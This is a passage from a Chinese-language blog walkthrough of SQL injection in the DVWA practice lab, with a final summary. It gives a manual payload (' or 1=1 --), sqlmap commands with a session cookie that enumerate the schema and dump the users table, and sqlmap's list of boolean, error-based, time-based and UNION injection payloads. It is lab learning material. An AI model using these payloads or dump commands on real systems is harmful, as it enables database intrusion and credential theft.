</span></code></pre><p>立刻注意到 <code>$_SESSION['id']</code>，所以这个难度的注入点在会话信息中。此时考虑一个情况：会话保存在哪儿？Cookies 还是服务端？<p>如果保存在服务端，那么此处就没有注入的可能，因为无法控制<code>$_SESSION['id']</code>的值。先看一眼 Cookies 里有没有。<blockquote><p>事后反省：我又傻逼了。那个弹出的窗口就是让你控制 <code>$_SESSION['id']</code>的。<p>删除一段胡乱分析的内容。</blockquote><p>....总之，先试试<code>'</code>。<p><img alt=image-20220427151241418 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427151241418.webp><p>很好，还是有注入的。<p>接着试一试 Low 难度的 payload：<code>' or 1=1 --</code>。<p><img alt=image-20220427151343515 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427151343515.webp><p>好了，我觉得不用继续了，剩下无非是把 Low 难度的 payload 重复一遍。<h3 id=sqlmap>sqlmap</h3><p>手工注入成功之后可以尝试下自动工具了。<code>sqlmap</code> 是一个非常著名的自动SQL注入工具，这里拿 sqlmap 玩一玩。<p>直接在虚拟机里安装 sqlmap <code>sudo apt install -y sqlmap</code>，然后开始。<pre class=language-bash data-lang=bash style=color:#fdf4c1aa;background-color:#282828><code class=language-bash data-lang=bash><span style=color:#fdf4c1>sqlmap -u </span><span style=color:#b8bb26>'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#'</span><span style=color:#fdf4c1> --cookie </span><span style=color:#b8bb26>'PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low'
</span></code></pre><p>经过一大串输出和询问如何测试之后，得到下面的报告：<pre style=color:#fdf4c1aa;background-color:#282828><code><span>sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
</span><span>---
</span><span>Parameter: id (GET)
</span><span>    Type: boolean-based blind
</span><span>    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
</span><span>    Payload: id=1' OR NOT 4667=4667#&Submit=Submit
</span><span>
</span><span>    Type: error-based
</span><span>    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
</span><span>    Payload: id=1' AND EXTRACTVALUE(2744,CONCAT(0x5c,0x7170786b71,(SELECT (ELT(2744=2744,1))),0x71627a7171))-- HCVJ&Submit=Submit
</span><span>
</span><span>    Type: time-based blind
</span><span>    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
</span><span>    Payload: id=1' AND (SELECT 7426 FROM (SELECT(SLEEP(5)))bhNh)-- bKjP&Submit=Submit
</span><span>
</span><span>    Type: UNION query
</span><span>    Title: MySQL UNION query (NULL) - 2 columns
</span><span>    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x64687569466e4454474c614e644e7543524f49417450684b547a506d65756c54576e56466255644a,0x71627a7171)#&Submit=Submit
</span><span>---
</span></code></pre><p><code>sqlmap</code> 发现 <code>id</code> 脆弱而且列出了三种攻击方式和对应的 payload，这里我使用的是 <code>UNION query</code>法，前面所说的稳定的1比特观察窗口就是 <code>boolean-based blind</code>，一种盲注攻击法。因为1比特的观察窗口虽然稳定但真的太小了，所以一般靠这个盲注的时候都是拿脚本跑（如上所示，比如用<code>sqlmap</code>来跑）。<p>更让人感到惊喜的是甚至给出了<code>id</code>可能可以用于反射型XSS，可以说非常牛逼了。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
</span></code></pre><p>通过添加参数还可以枚举出更多信息。<pre class=language-bash data-lang=bash style=color:#fdf4c1aa;background-color:#282828><code class=language-bash data-lang=bash><span style=color:#fdf4c1>sqlmap -u </span><span style=color:#b8bb26>'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#'</span><span style=color:#fdf4c1> --cookie </span><span style=color:#b8bb26>'PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low'</span><span style=color:#fdf4c1> --dbs --tables --columns
</span></code></pre><p><img alt=image-20220427153558093 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427153558093.webp><p>一键列出表名和字段名！<p>然后我们直接用 sqlmap 列出 <code>dvwa.users</code> 这个表的内容。<pre class=language-bash data-lang=bash style=color:#fdf4c1aa;background-color:#282828><code class=language-bash data-lang=bash><span style=color:#fdf4c1>sqlmap -u </span><span style=color:#b8bb26>'http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#'</span><span style=color:#fdf4c1> --cookie </span><span style=color:#b8bb26>'PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low'</span><span style=color:#fdf4c1> -D dvwa -T users --dump
</span></code></pre><p><img alt=image-20220427153909726 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-06/image-20220427153909726.webp><p>完成。之后可能再专门学一学 sqlmap 可以怎么玩，DVWA 确实是个好靶场。<h2 id=zong-jie>总结</h2><p>SQL注入还算是熟悉一点，毕竟上初中那会儿就玩过了，就是那时候不懂事根本没细看。可惜了年轻的自己就是个傻逼啊。<p>SQL注入没什么可总结的，熟悉SQL之后DVWA这种简单的注入是信手拈来的事情，连源码都给了，注不进去才奇怪。之后研究sqlmap的时候可能再看看都有什么注入技巧，说不定也是可以迁移到其他地方的。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/dvwa>/dvwa/</a> <a href=/tags/sqli>/sqli/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>